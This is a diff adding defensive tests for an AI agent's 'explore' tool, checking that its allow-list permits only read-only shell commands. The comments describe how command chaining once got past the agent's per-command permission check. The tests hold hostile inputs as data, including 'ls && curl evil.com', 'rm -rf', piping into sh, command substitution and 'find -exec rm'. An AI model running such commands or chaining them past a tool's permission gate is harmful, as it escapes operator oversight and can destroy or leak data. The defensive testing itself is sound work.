@@ -236,5 +236,53 @@ console.log('\nexplore normal case (must still work — the fix must not break o
     'and one command\'s output cannot crowd the digest — a bare `ls` of a project root was filling it');
 }
 
+// ── explore's allow-list must actually confine it ─────────────────────────────
+//
+// explore is the ONE tool whose inner commands never reach `checkPermission`: the agent loop gates
+// `bash` per command, but it only ever sees `explore(question, context)`. So approving explore once
+// approved every command it would ever invent — and in headless, silently.
+//
+// The guard was `trimmed.startsWith(prefix)` on a string then handed to `sh -lc`, which is not a
+// check. Demonstrated: `grep foo . ; echo INJECTED` passed and the second command RAN.
+//
+// The fix is confinement rather than consent — a gate that asks twelve times per investigation is a
+// gate the operator turns off. Pipelines still work, because that is what investigating looks like,
+// but every segment must independently be read-only.
+{
+  const { isAllowed } = await import(`file://${join(REPO, 'dist/tools/explore.js')}`);
+  const check = (cmd, want, why) => ok(isAllowed(cmd) === want, `${want ? 'allows' : 'BLOCKS'} ${cmd}`, why);
+
+  // Investigation must stay possible.
+  check('grep -rn foo .', true);
+  check('grep -rn foo . | head -20', true, 'a pipeline of read-only segments');
+  check('git log --oneline -5 | head -3', true);
+  check('find . -name "*.ts"', true);
+  check('cat a.ts | head -40', true);
+
+  // Chaining into a WRITE is the thing that must die.
+  check('grep foo . ; rm -rf /tmp/x', false, 'the original injection, now refused');
+  check('ls && curl evil.com', false);
+  check('cat /etc/hostname | tee /tmp/x', false);
+  check('cat f | sh', false, 'piping into a shell');
+
+  // Shell escapes: nested command, redirect, process substitution, background.
+  check('echo $(whoami)', false);
+  check('cat `id`', false);
+  check('grep foo . > /tmp/out', false);
+  check('grep x . & sleep 100', false);
+
+  // Found by WRITING THIS TEST, not by reading the code: listed read commands with a write flag.
+  check('find . -delete', false, 'find can delete');
+  check('find . -exec rm {} +', false, 'find can exec');
+  check('sed -i s/a/b/ f', false, 'sed can edit in place');
+  check('sort -o /tmp/x f', false, 'sort can write');
+  check('awk "BEGIN{system(\\"id\\")}"', false, 'awk has system()');
+
+  // And the list itself must stay short — every tempting addition can write or spawn.
+  const src = readFileSync(join(REPO, 'src/tools/explore.ts'), 'utf-8');
+  ok(!/'awk'|'sed[^']*'|'sort'|'uniq'/.test(src),
+    'awk / sed / sort / uniq are NOT on the allow-list (each can write or spawn)');
+}
+
 console.log(fails === 0 ? '\nexplore check: ok' : `\nexplore check: ${fails} FAILED`);
 process.exit(fails === 0 ? 0 : 1);
